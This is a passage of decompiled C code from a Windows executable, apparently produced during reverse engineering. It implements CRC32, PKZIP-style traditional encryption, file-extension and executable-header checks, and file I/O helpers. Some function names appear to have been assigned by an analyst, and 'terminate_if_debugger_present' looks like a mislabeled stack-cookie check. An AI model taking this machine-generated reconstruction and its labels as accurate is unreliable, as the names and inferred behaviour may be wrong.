    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((*param_1 ^ uVar1) & 0xff) * 4);
    param_1 = param_1 + 1;
  }
  return ~uVar1;
}



void __fastcall FUN_003aca10(char param_1,uint *param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_003ce9f0 + (((int)param_1 ^ *param_2) & 0xff) * 4) ^ *param_2 >> 8;
  *param_2 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;
  param_2[1] = uVar1;
  param_2[2] = param_2[2] >> 8 ^
               *(uint *)(&DAT_003ce9f0 + ((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_003aca60(void)

{
  int iVar1;
  char *pcVar2;
  char *unaff_EDI;
  
  iVar1 = (*_DAT_003d9418)();
  for (pcVar2 = unaff_EDI + iVar1; (unaff_EDI < pcVar2 && (*pcVar2 != '.')); pcVar2 = pcVar2 + -1) {
  }
  if ((pcVar2 == unaff_EDI) && (*pcVar2 != '.')) {
    return false;
  }
  iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c14);
  if ((((iVar1 != 0) && (iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d0b04), iVar1 != 0)) &&
      (iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c18), iVar1 != 0)) &&
     (((iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c20), iVar1 != 0 &&
       (iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c28), iVar1 != 0)) &&
      ((iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c30), iVar1 != 0 &&
       (iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c38), iVar1 != 0)))))) {
    iVar1 = (*_DAT_003d9550)(pcVar2,&DAT_003d1c3c);
    return iVar1 == 0;
  }
  return true;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003acb10(undefined param_1)

{
  uint uVar1;
  ushort *unaff_ESI;
  undefined2 *unaff_EDI;
  undefined *puVar2;
  undefined2 local_18;
  ushort uStack22;
  ushort local_12;
  undefined2 uStack16;
  ushort uStack14;
  ushort local_c;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  puVar2 = &param_1;
  (*_DAT_003d95b4)(puVar2,&local_18);
  *unaff_ESI = (ushort)(((CONCAT22(uStack22,local_18) + -0x3c) * 0x10 | uStack22 & 0xf) << 5) |
               local_12 & 0x1f;
  uVar1 = (uStack14 & 0x3f | CONCAT22(uStack14,uStack16) << 6) << 5 | (uint)local_c * 2 & 0x1f;
  *unaff_EDI = (short)uVar1;
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar1,(char)puVar2);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_003acb80(uint *param_1,uint *param_2,undefined4 param_3,uint *param_4,undefined4 *param_5)

{
  uint *puVar1;
  undefined4 extraout_EDX;
  uint uVar2;
  uint uVar3;
  undefined unaff_SI;
  undefined8 uVar4;
  ulonglong uVar5;
  ulonglong uVar6;
  undefined uVar7;
  int local_70;
  uint *local_6c;
  int local_68;
  uint local_64;
  uint *local_60;
  undefined local_5c [4];
  uint local_58;
  short local_54 [2];
  uint local_50;
  uint local_4c;
  int local_48;
  uint local_44;
  int local_40;
  uint local_3c;
  uint *local_38;
  undefined2 local_1c;
  ushort uStack26;
  ushort local_16;
  ushort uStack20;
  ushort local_12;
  ushort uStack16;
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_6c = param_4;
  uVar7 = 0xb0;
  local_60 = param_2;
  uVar4 = (*_DAT_003d94b0)(param_3);
  if ((int)uVar4 == 0) {
    terminate_if_debugger_present
              (local_c ^ (uint)&stack0xfffffffc,(int)((ulonglong)uVar4 >> 0x20),unaff_SI);
    return;
  }
  uVar2 = (uint)((local_50 & 1) != 0);
  if ((local_50 & 2) != 0) {
    uVar2 = uVar2 | 2;
  }
  if ((local_50 & 4) != 0) {
    uVar2 = uVar2 | 4;
  }
  if ((local_50 & 0x10) != 0) {
    uVar2 = uVar2 | 0x10;
  }
  if ((local_50 & 0x20) != 0) {
    uVar2 = uVar2 | 0x20;
  }
  if ((local_50 & 0x10) == 0) {
    uVar2 = uVar2 | 0x80000000;
  }
  else {
    uVar2 = uVar2 | 0x40000000;
  }
  uVar3 = uVar2 | 0x1000000;
  if ((local_50 & 1) == 0) {
    uVar3 = uVar2 | 0x1800000;
  }
  uVar5 = (*_DAT_003d9590)(param_3,0);
  local_58 = (uint)uVar5;
  if (0x28 < local_58) {
    (*_DAT_003d93d0)(param_3,0,0,0);
    (*_DAT_003d94dc)(param_3,local_54,2,local_5c,0);
    (*_DAT_003d93d0)(param_3,0x24,0,0);
    (*_DAT_003d94dc)(param_3,&local_70,4,local_5c,0);
    uVar5 = CONCAT44(0x54ad,local_58);
    if ((local_54[0] == 0x54ad) && (uVar5 = CONCAT44(0x54ad,local_58), local_70 + 0x34U < local_58))
    {
      (*_DAT_003d93d0)(param_3,local_70,0,0);
      (*_DAT_003d94dc)(param_3,&local_68,4,local_5c,0);
      if ((local_68 == 0x5a4d) ||
         (((local_68 == 0x454e || (local_68 == 0x454c)) ||
          (uVar5 = CONCAT44(extraout_EDX,local_58), local_68 == 0x4550)))) {
        uVar3 = uVar3 | 0x400000;
        uVar5 = CONCAT44(extraout_EDX,local_58);
      }
    }
  }
  local_58 = (uint)uVar5;
  if (local_6c != (uint *)0x0) {
    *local_6c = uVar3;
  }
  if (param_1 != (uint *)0x0) {
    *param_1 = local_58;
  }
  if (param_5 != (undefined4 *)0x0) {
    uVar4 = __alldiv(local_44 + 0x2ac18000,(local_40 + -0x19db1de) - (uint)(local_44 < 0xd53e8000),
                     10000000,0);
    param_5[1] = (int)((ulonglong)uVar4 >> 0x20);
    *param_5 = (int)uVar4;
    uVar4 = __alldiv(local_3c + 0x2ac18000,
                     (int)local_38 + (-0x19db1de - (uint)(local_3c < 0xd53e8000)),10000000,0);
    param_5[2] = (int)uVar4;
    param_5[3] = (int)((ulonglong)uVar4 >> 0x20);
    uVar6 = __alldiv(local_4c + 0x2ac18000,(local_48 + -0x19db1de) - (uint)(local_4c < 0xd53e8000),
                     10000000,0);
    uVar5 = uVar6 & 0xffffffff00000000 | (ulonglong)local_58;
    param_5[4] = (int)uVar6;
    param_5[5] = (int)(uVar6 >> 0x20);
  }
  puVar1 = local_60;
  local_58 = (uint)uVar5;
  if (local_60 != (uint *)0x0) {
    local_64 = local_3c;
    local_60 = local_38;
    (*_DAT_003d95b4)(&local_64,&local_1c);
    uVar5 = CONCAT44((uint)uStack16 * 2,local_58) & 0x1fffffffff;
    *puVar1 = (((CONCAT22(uStack26,local_1c) + -0x3c) * 0x10 & 0x7ffU | uStack26 & 0xf) << 5 |
              local_16 & 0x1f) << 0x10 | (local_12 & 0x3f | (uStack20 & 0x1f) << 6) << 5 |
              (uint)uStack16 * 2 & 0x1f;
  }
  local_58 = (uint)uVar5;
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,(int)(uVar5 >> 0x20),uVar7);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_003acdd0(void)

{
  int iVar1;
  int unaff_ESI;
  int unaff_EDI;
  
  if ((((*(int *)(unaff_ESI + 4) == 0) && (*(int *)(unaff_ESI + 0xc) == 0)) &&
      (*(int *)(unaff_ESI + 0x20) == 0)) &&
     (((*(int *)(unaff_ESI + 0x18) == 0 && (*(int *)(unaff_ESI + 0x14) == 0)) &&
      (*(char *)(unaff_ESI + 0x2c) == '\0')))) {
    if (unaff_EDI == 0) {
      return 0x30000;
    }
    iVar1 = (*_DAT_003d93a4)(0xffffffff,0,4,0);
    *(int *)(unaff_ESI + 0xc) = iVar1;
    if (iVar1 != 0) {
      iVar1 = (*_DAT_003d951c)(iVar1,0xf001f,0,0);
      *(int *)(unaff_ESI + 0x20) = iVar1;
      if (iVar1 != 0) {
        *(undefined *)(unaff_ESI + 0x1c) = 1;
        *(undefined4 *)(unaff_ESI + 0x24) = 0;
        *(int *)(unaff_ESI + 0x28) = unaff_EDI;
        return 0;
      }
      (*_DAT_003d93b8)(*(undefined4 *)(unaff_ESI + 0xc));
      *(undefined4 *)(unaff_ESI + 0xc) = 0;
    }
    return 0x300;
  }
  return 0x1000000;
}



void __cdecl FUN_003ace60(void *param_1,undefined4 *param_2,uint *param_3)

{
  uint uVar1;
  
  if (*param_3 == 0) {
    return;
  }
  uVar1 = FUN_003ace90(param_1,param_2,*param_3);
  if (uVar1 != 0) {
    *param_3 = 0;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __thiscall FUN_003ace90(void *this,undefined4 *param_1,uint param_2)

{
  byte bVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  
  uVar4 = param_2;
  if (*(char *)((int)this + 0x2d) != '\0') {
    if ((*(void **)((int)this + 0x3c) != (void *)0x0) && (*(uint *)((int)this + 0x40) < param_2)) {
      FUN_003aee4b(*(void **)((int)this + 0x3c));
      *(undefined4 *)((int)this + 0x3c) = 0;
    }
    if (*(int *)((int)this + 0x3c) == 0) {
      uVar2 = FUN_003b103e(uVar4 * 2);
      *(undefined4 *)((int)this + 0x3c) = uVar2;
      *(uint *)((int)this + 0x40) = uVar4;
    }
    FUN_003aee70(*(undefined4 **)((int)this + 0x3c),param_1,uVar4);
    uVar5 = 0;
    if (uVar4 != 0) {
      do {
        bVar1 = *(byte *)(uVar5 + *(int *)((int)this + 0x3c));
        uVar4 = *(uint *)((int)this + 0x38);
        uVar3 = *(uint *)(&DAT_003ce9f0 +
                         (((int)(char)bVar1 ^ *(uint *)((int)this + 0x30)) & 0xff) * 4) ^
                *(uint *)((int)this + 0x30) >> 8;
        *(uint *)((int)this + 0x30) = uVar3;
        uVar3 = ((uVar3 & 0xff) + *(int *)((int)this + 0x34)) * 0x8088405 + 1;
        *(uint *)((int)this + 0x34) = uVar3;
        *(uint *)((int)this + 0x38) =
             uVar4 >> 8 ^ *(uint *)(&DAT_003ce9f0 + ((uVar3 >> 0x18 ^ uVar4) & 0xff) * 4);
        uVar4 = uVar4 & 0xfffd | 2;
        uVar3 = uVar5 + 1;
        *(byte *)(uVar5 + *(int *)((int)this + 0x3c)) = (byte)((uVar4 ^ 1) * uVar4 >> 8) ^ bVar1;
        uVar5 = uVar3;
        uVar4 = param_2;
      } while (uVar3 < param_2);
    }
    param_1 = *(undefined4 **)((int)this + 0x3c);
  }
  if (*(int *)((int)this + 0x20) == 0) {
    if (*(int *)((int)this + 4) == 0) {
      *(undefined4 *)((int)this + 0x14) = 0x1000000;
      return 0;
    }
    (*_DAT_003d9420)(*(int *)((int)this + 4),param_1,uVar4,&param_2,0);
    return param_2;
  }
  if (*(int *)((int)this + 0x24) + uVar4 < *(uint *)((int)this + 0x28)) {
    FUN_003aee70((undefined4 *)(*(int *)((int)this + 0x24) + *(int *)((int)this + 0x20)),param_1,
                 uVar4);
    *(int *)((int)this + 0x24) = *(int *)((int)this + 0x24) + uVar4;
    return uVar4;
  }
  *(undefined4 *)((int)this + 0x14) = 0x30000;
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __fastcall FUN_003acff0(undefined4 param_1,uint param_2)

{
  int in_EAX;
  uint3 uVar2;
  undefined4 uVar1;
  
  uVar2 = (uint3)((uint)in_EAX >> 8);
  if (*(char *)(in_EAX + 0x1c) == '\0') {
    *(undefined4 *)(in_EAX + 0x14) = 0x2000000;
    return (uint)uVar2 << 8;
  }
  if (*(int *)(in_EAX + 0x20) != 0) {
    if (*(uint *)(in_EAX + 0x28) <= param_2) {
      *(undefined4 *)(in_EAX + 0x14) = 0x30000;
      return (uint)uVar2 << 8;
    }
    *(uint *)(in_EAX + 0x24) = param_2;
    return CONCAT31(uVar2,1);
  }
  if (*(int *)(in_EAX + 4) != 0) {
    uVar1 = (*_DAT_003d93d0)(*(int *)(in_EAX + 4),*(int *)(in_EAX + 0x10) + param_2,0,0);
    return CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  *(undefined4 *)(in_EAX + 0x14) = 0x1000000;
  return (uint)uVar2 << 8;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __fastcall FUN_003ad040(undefined4 param_1)

{
  int unaff_ESI;
  undefined4 uVar1;
  
  uVar1 = 0;
  if (*(char *)(unaff_ESI + 0x2c) == '\0') {
    uVar1 = FUN_003ae070(param_1);
  }
  *(undefined *)(unaff_ESI + 0x2c) = 1;
  if ((*(int *)(unaff_ESI + 0x20) != 0) && (*(int *)(unaff_ESI + 0xc) != 0)) {
    (*_DAT_003d94d8)(*(int *)(unaff_ESI + 0x20));
  }
  *(undefined4 *)(unaff_ESI + 0x20) = 0;
  if (*(int *)(unaff_ESI + 0xc) != 0) {
    (*_DAT_003d93b8)(*(int *)(unaff_ESI + 0xc));
  }
  *(undefined4 *)(unaff_ESI + 0xc) = 0;
  if ((*(int *)(unaff_ESI + 4) != 0) && (*(char *)(unaff_ESI + 8) != '\0')) {
    (*_DAT_003d93b8)(*(int *)(unaff_ESI + 4));
  }
  *(undefined4 *)(unaff_ESI + 4) = 0;
  *(undefined *)(unaff_ESI + 8) = 0;
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_003ad0a0(void)

{
  int in_EAX;
  int iVar1;
  int iVar2;
  int unaff_ESI;
  undefined8 uVar3;
  
  *(undefined4 *)(unaff_ESI + 0x7c) = 0;
  *(undefined4 *)(unaff_ESI + 0x84) = 0;
  *(undefined *)(unaff_ESI + 0x80) = 0;
  *(undefined4 *)(unaff_ESI + 0x78) = 0;
  *(undefined4 *)(unaff_ESI + 0x70) = 0;
  *(undefined4 *)(unaff_ESI + 0x90) = 0;
  *(undefined4 *)(unaff_ESI + 0x74) = 0;
  if (in_EAX == 0) {
    return 0x10000;
  }
  uVar3 = (*_DAT_003d93b4)();
  iVar1 = (int)uVar3;
  if (iVar1 == -1) {
    return 0x200;
  }
  iVar2 = FUN_003ad120(iVar1,(int)((ulonglong)uVar3 >> 0x20),0);
  if (iVar2 != 0) {
    (*_DAT_003d93b8)(iVar1);
    return iVar2;
  }
  *(undefined *)(unaff_ESI + 0x80) = 1;
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003ad120(int param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 extraout_EDX;
  undefined4 uVar3;
  int unaff_EBX;
  undefined8 uVar4;
  undefined uVar5;
  int iVar6;
  uint local_2c;
  int local_28;
  undefined2 local_24;
  undefined2 local_20;
  undefined local_1c [16];
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *(undefined4 *)(unaff_EBX + 0x7c) = 0;
  *(undefined4 *)(unaff_EBX + 0x84) = 0;
  *(undefined *)(unaff_EBX + 0x80) = 0;
  *(undefined4 *)(unaff_EBX + 0x78) = 0;
  *(undefined4 *)(unaff_EBX + 0x70) = 0;
  *(undefined4 *)(unaff_EBX + 0x90) = 0;
  *(undefined4 *)(unaff_EBX + 0x74) = 0;
  iVar6 = param_1;
  if ((param_1 != 0) && (param_1 != -1)) {
    iVar1 = (*_DAT_003d93d0)(*(undefined4 *)(unaff_EBX + 4),0,0,1);
    if (iVar1 == -1) {
      *(undefined4 *)(unaff_EBX + 0x4c) = 0x80000000;
      *(undefined4 *)(unaff_EBX + 0x70) = 0xffffffff;
      if (param_3 != 0) {
        *(int *)(unaff_EBX + 0x70) = param_3;
      }
      uVar5 = 0xe4;
      *(undefined *)(unaff_EBX + 0x6c) = 0;
      (*_DAT_003d94a8)();
      (*_DAT_003d94c4)(local_1c,&local_2c);
      FUN_003acb10((char)local_2c);
      uVar4 = __alldiv(local_2c + 0x2ac18000,(local_28 + -0x19db1de) - (uint)(local_2c < 0xd53e8000)
                       ,10000000,0);
      uVar3 = (undefined4)((ulonglong)uVar4 >> 0x20);
      uVar2 = (undefined4)uVar4;
      *(undefined4 *)(unaff_EBX + 0x54) = uVar3;
      *(undefined4 *)(unaff_EBX + 0x50) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x58) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x60) = uVar2;
      *(undefined4 *)(unaff_EBX + 0x5c) = uVar3;
      *(undefined4 *)(unaff_EBX + 100) = uVar3;
      *(uint *)(unaff_EBX + 0x68) = CONCAT22(local_24,local_20);
      *(int *)(unaff_EBX + 0x7c) = iVar6;
      terminate_if_debugger_present
                (local_c ^ (uint)&stack0xfffffffc,CONCAT22(local_24,local_20),uVar5);
      return;
    }
    uVar4 = FUN_003acb80((uint *)(unaff_EBX + 0x70),(uint *)(unaff_EBX + 0x68),param_1,
                         (uint *)(unaff_EBX + 0x4c),(undefined4 *)(unaff_EBX + 0x50));
    param_2 = (undefined4)((ulonglong)uVar4 >> 0x20);
    iVar1 = (int)uVar4;
    if (iVar1 == 0) {
      (*_DAT_003d93d0)(param_1,0,0,0);
      *(undefined *)(unaff_EBX + 0x6c) = 1;
      *(int *)(unaff_EBX + 0x7c) = param_1;
      terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,extraout_EDX,(char)iVar1);
      return;
    }
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,param_2,(char)iVar6);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_003ad280(int param_1,undefined4 param_2,int param_3)

{
  undefined4 uVar1;
  undefined4 uVar2;
  uint uVar3;
  int unaff_ESI;
  undefined8 uVar4;
  undefined uVar5;
  undefined1 in_stack_ffffffc4;
  uint local_34;
  int local_30;
  undefined local_2c [16];
  undefined2 local_1c;
  ushort uStack26;
  ushort local_16;
  ushort uStack20;
  ushort local_12;
  ushort uStack16;
  uint local_c;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *(undefined4 *)(unaff_ESI + 0x7c) = 0;
  *(int *)(unaff_ESI + 0x84) = param_1;
  *(undefined *)(unaff_ESI + 0x80) = 0;
  *(undefined4 *)(unaff_ESI + 0x78) = 0;
  *(undefined4 *)(unaff_ESI + 0x90) = 0;
  *(undefined4 *)(unaff_ESI + 0x74) = 0;
  *(int *)(unaff_ESI + 0x88) = param_3;
  *(undefined4 *)(unaff_ESI + 0x8c) = 0;
  if ((param_1 != 0) && (param_3 != 0)) {
    *(int *)(unaff_ESI + 0x70) = param_3;
    *(undefined4 *)(unaff_ESI + 0x4c) = 0x80000000;
    *(undefined *)(unaff_ESI + 0x6c) = 1;
    (*_DAT_003d94a8)(local_2c);
    (*_DAT_003d94c4)(local_2c,&local_34);
    uVar5 = 0xe4;
    (*_DAT_003d95b4)(&stack0xffffffc4);
    uVar4 = __alldiv(local_34 + 0x2ac18000,(local_30 + -0x19db1de) - (uint)(local_34 < 0xd53e8000),
                     10000000,0);
    uVar2 = (undefined4)((ulonglong)uVar4 >> 0x20);
    uVar1 = (undefined4)uVar4;
    *(undefined4 *)(unaff_ESI + 0x50) = uVar1;
    *(undefined4 *)(unaff_ESI + 0x58) = uVar1;
    *(undefined4 *)(unaff_ESI + 0x60) = uVar1;
    *(undefined4 *)(unaff_ESI + 0x5c) = uVar2;
    *(undefined4 *)(unaff_ESI + 100) = uVar2;
    *(undefined4 *)(unaff_ESI + 0x54) = uVar2;
    uVar3 = (((CONCAT22(uStack26,local_1c) + -0x3c) * 0x10 & 0x7ffU | uStack26 & 0xf) << 5 |
            local_16 & 0x1f) << 0x10 | (local_12 & 0x3f | (uStack20 & 0x1f) << 6) << 5 |
            (uint)uStack16 * 2 & 0x1f;
    *(uint *)(unaff_ESI + 0x68) = uVar3;
    terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,uVar3,uVar5);
    return;
  }
  terminate_if_debugger_present(local_c ^ (uint)&stack0xfffffffc,param_2,in_stack_ffffffc4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_003ad3b0(void)

{
  undefined4 uVar1;
  undefined4 uVar2;
  uint uVar3;
  int unaff_ESI;
  undefined8 uVar4;
  undefined uVar5;
  uint local_38;
  int local_34;
  uint local_30;
  int local_2c;
  undefined local_28 [16];
  undefined2 local_18;
  ushort uStack22;
  ushort local_12;
  ushort uStack16;
  ushort local_e;
  ushort uStack12;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *(undefined4 *)(unaff_ESI + 0x7c) = 0;
  *(undefined4 *)(unaff_ESI + 0x84) = 0;
  *(undefined *)(unaff_ESI + 0x80) = 0;
  *(undefined4 *)(unaff_ESI + 0x78) = 0;
  *(undefined4 *)(unaff_ESI + 0x90) = 0;
  *(undefined4 *)(unaff_ESI + 0x74) = 0;
  *(undefined4 *)(unaff_ESI + 0x4c) = 0x41c00010;
  *(undefined4 *)(unaff_ESI + 0x70) = 0;
  *(undefined *)(unaff_ESI + 0x6c) = 0;
  (*_DAT_003d94a8)(local_28);
  (*_DAT_003d94c4)(local_28,&local_30);
  uVar5 = 0xe8;
  local_38 = local_30;
  local_34 = local_2c;
  (*_DAT_003d95b4)(&local_38);
  uVar4 = __alldiv(local_30 + 0x2ac18000,(local_2c + -0x19db1de) - (uint)(local_30 < 0xd53e8000),
                   10000000,0);
  uVar2 = (undefined4)((ulonglong)uVar4 >> 0x20);
  uVar1 = (undefined4)uVar4;
  *(undefined4 *)(unaff_ESI + 0x50) = uVar1;
  *(undefined4 *)(unaff_ESI + 0x58) = uVar1;
  *(undefined4 *)(unaff_ESI + 0x60) = uVar1;
  *(undefined4 *)(unaff_ESI + 0x5c) = uVar2;
  *(undefined4 *)(unaff_ESI + 100) = uVar2;
  *(undefined4 *)(unaff_ESI + 0x54) = uVar2;
  uVar3 = (((CONCAT22(uStack22,local_18) + -0x3c) * 0x10 & 0x7ffU | uStack22 & 0xf) << 5 |
          local_12 & 0x1f) << 0x10 | (local_e & 0x3f | (uStack16 & 0x1f) << 6) << 5 |
          (uint)uStack12 * 2 & 0x1f;
  *(uint *)(unaff_ESI + 0x68) = uVar3;
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar3,uVar5);
  return;
}



void __thiscall FUN_003ad4b0(void *this,undefined4 param_1,undefined4 param_2,uint param_3)

{
  FUN_003ad4d0((uint)this,param_3);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __fastcall FUN_003ad4d0(uint param_1,uint param_2)

{
  uint uVar1;
  int iVar2;
  undefined4 *unaff_EBX;
  int unaff_ESI;
  uint uVar3;
  
  if (*(int *)(unaff_ESI + 0x84) == 0) {
    if (*(int *)(unaff_ESI + 0x7c) == 0) {
      *(undefined4 *)(unaff_ESI + 0x14) = 0x1000000;
    }
    else {
      iVar2 = (*_DAT_003d94dc)(*(int *)(unaff_ESI + 0x7c));
      if (iVar2 != 0) {
        *(int *)(unaff_ESI + 0x74) = *(int *)(unaff_ESI + 0x74) + param_1;
        uVar1 = FUN_003ac910((byte *)unaff_EBX,param_1);
        *(uint *)(unaff_ESI + 0x78) = uVar1;
        return param_1;
      }
    }
  }
  else {
    uVar1 = *(uint *)(unaff_ESI + 0x8c);
    if (uVar1 < *(uint *)(unaff_ESI + 0x88)) {
      uVar3 = *(uint *)(unaff_ESI + 0x88) - uVar1;
      if (param_2 < uVar3) {
        uVar3 = param_2;
      }
      FUN_003aee70(unaff_EBX,(undefined4 *)(uVar1 + *(int *)(unaff_ESI + 0x84)),uVar3);
      *(int *)(unaff_ESI + 0x8c) = *(int *)(unaff_ESI + 0x8c) + uVar3;
      *(int *)(unaff_ESI + 0x74) = *(int *)(unaff_ESI + 0x74) + uVar3;
      uVar1 = FUN_003ac910((byte *)unaff_EBX,uVar3);
      *(uint *)(unaff_ESI + 0x78) = uVar1;
      return uVar3;
    }
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_003ad570(void)

{
  int unaff_ESI;
  
  if ((*(char *)(unaff_ESI + 0x80) != '\0') && (*(int *)(unaff_ESI + 0x7c) != 0)) {
    (*_DAT_003d93b8)(*(int *)(unaff_ESI + 0x7c));
  }
  *(undefined4 *)(unaff_ESI + 0x7c) = 0;
  if ((*(int *)(unaff_ESI + 0x70) != -1) &&
     (*(int *)(unaff_ESI + 0x70) != *(int *)(unaff_ESI + 0x74))) {
    *(undefined4 *)(unaff_ESI + 0x70) = *(undefined4 *)(unaff_ESI + 0x74);
    return 0x60000;
  }
  *(undefined4 *)(unaff_ESI + 0x70) = *(undefined4 *)(unaff_ESI + 0x74);
  return 0;
}



undefined4 FUN_003ad5d0(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int unaff_EDI;
  
  if (*(int *)(unaff_EDI + 0x48) == 0) {
    iVar1 = FUN_003b103e(0x6afa8);
    if (iVar1 == 0) {
      iVar1 = 0;
    }
    else {
      FUN_003aa110();
      *(undefined4 *)(iVar1 + 0x6af70) = 0;
    }
    *(int *)(unaff_EDI + 0x48) = iVar1;
  }
  *(undefined4 *)(*(int *)(unaff_EDI + 0x48) + 0x6afa4) = 0;
  *(code **)(*(int *)(unaff_EDI + 0x48) + 0xc) = FUN_003ad4b0;
  *(code **)(*(int *)(unaff_EDI + 0x48) + 0x10) = FUN_003ace60;
  **(int **)(unaff_EDI + 0x48) = unaff_EDI;
  *(undefined4 *)(*(int *)(unaff_EDI + 0x48) + 4) = 8;
  *(undefined *)(*(int *)(unaff_EDI + 0x48) + 8) = *(undefined *)(unaff_EDI + 0x6c);
  *(undefined4 *)(*(int *)(unaff_EDI + 0x48) + 0x6afa4) = 0;
  *(undefined2 *)(*(int *)(unaff_EDI + 0x48) + 0xe7e) = 0;
  *(undefined4 *)(*(int *)(unaff_EDI + 0x48) + 0x6af70) = 0;
  iVar1 = *(int *)(unaff_EDI + 0x48);
  *(int *)(iVar1 + 0x1af60) = unaff_EDI + 0x94;
  *(undefined4 *)(iVar1 + 0x1af68) = 0x4000;
  *(undefined4 *)(iVar1 + 0x1af64) = 0;
  *(undefined4 *)(iVar1 + 0x1af54) = 1;
  *(undefined4 *)(iVar1 + 0x1af58) = 0;
  *(undefined4 *)(iVar1 + 0x1af5c) = 0;
  *(undefined4 *)(iVar1 + 0x1af6c) = 0;
  FUN_003aa1f0();
  FUN_003ab670(*(void **)(unaff_EDI + 0x48),(ushort *)(param_1 + 4));
  uVar2 = FUN_003abc90();
  *(undefined4 *)(unaff_EDI + 0x90) = uVar2;
  uVar2 = 0;
  if (*(int *)(*(int *)(unaff_EDI + 0x48) + 0x6afa4) != 0) {
    uVar2 = 0x5000000;
  }
  return uVar2;
}



undefined4 __fastcall FUN_003ad6e0(uint param_1)

{
  uint uVar1;
  uint uVar2;
  uint extraout_ECX;
  void *unaff_EDI;
  int local_8;
  
  local_8 = 0;
  uVar1 = FUN_003ad4d0(param_1,0x4000);
  while ((uVar1 != 0 && (uVar1 != 0xffffffff))) {
    uVar2 = FUN_003ace90(unaff_EDI,(undefined4 *)((int)unaff_EDI + 0x94),uVar1);
    if (uVar2 != uVar1) {
      return 0x60000;
    }
    local_8 = local_8 + uVar1;
    uVar1 = FUN_003ad4d0(extraout_ECX,0x4000);
  }
  *(int *)((int)unaff_EDI + 0x90) = local_8;
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall
FUN_003ad750(char **debugger_indications,int param_2,undefined4 param_3,int param_4,int param_5)

{
  char **ppcVar1;
  byte bVar2;
  bool bVar3;
  undefined uVar4;
  char *pcVar5;
  size_t sVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  undefined4 uVar10;
  undefined4 *puVar11;
  undefined4 extraout_ECX;
  char *pcVar12;
  char *extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  char *extraout_EDX;
  char *extraout_EDX_00;
  undefined4 extraout_EDX_01;
  char *extraout_EDX_02;
  undefined4 extraout_EDX_03;
  char *extraout_EDX_04;
  char *extraout_EDX_05;
  char *extraout_EDX_06;
  char *extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 unaff_ESI;
  char *pcVar13;
  char *pcVar14;
  bool bVar15;
  undefined8 uVar16;
  undefined uVar17;
  int local_4b8;
  int local_4b4;
  int local_4b0;
  char *local_4ac;
  char local_4a5;
  undefined4 local_4a0;
  ushort local_49c;
  short local_49a;
  char *local_498;
  char *local_494;
  char *local_490;
  char *local_48c;
  int local_488;
  int local_484;
  size_t local_480;
  undefined4 local_47c;
  undefined2 local_478;
  undefined2 local_476;
  ushort local_474;
  char *local_470;
  char *local_46c;
  undefined local_468 [260];
  undefined4 *local_364;
  undefined4 *local_360;
  undefined4 local_35c;
  undefined local_358 [260];
  undefined local_254 [260];
  undefined4 local_150;
  undefined4 local_148;
  undefined4 local_144;
  char local_140 [264];
  undefined4 local_38 [3];
  undefined4 local_2c;
  undefined local_21;
  undefined4 local_20;
  undefined local_1c;
  undefined local_1b;
  undefined local_1a;
  undefined local_19;
  undefined local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  uint local_c;
  char **debugger_indications_buffer;
  
  local_c = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if (debugger_indications[5] != (char *)0x0) {
    terminate_if_debugger_present
              (local_c ^ (uint)&stack0xfffffffc,param_2,(char)debugger_indications);
    return;
  }
